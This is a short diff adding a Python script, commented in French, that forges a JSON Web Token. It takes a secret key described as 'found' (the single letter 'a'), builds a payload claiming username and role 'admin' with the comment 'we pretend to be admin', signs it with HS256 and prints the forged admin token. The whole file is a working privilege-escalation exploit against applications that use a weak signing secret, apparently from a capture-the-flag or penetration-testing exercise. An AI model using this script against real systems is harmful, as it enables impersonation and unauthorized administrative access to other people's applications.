@@ -1,0 +1,15 @@
+import jwt
+
+# Clé secrète trouvée
+key = "a"
+
+# Nouveau payload (modifie selon la structure du JWT initial)
+payload = {
+    "username": "admin",  # On se fait passer pour admin
+    "role": "admin"  # Si l'application vérifie un rôle
+}
+
+# Générer un JWT signé avec la clé
+new_token = jwt.encode(payload, key, algorithm="HS256")
+
+print(f"New Admin JWT: {new_token}")
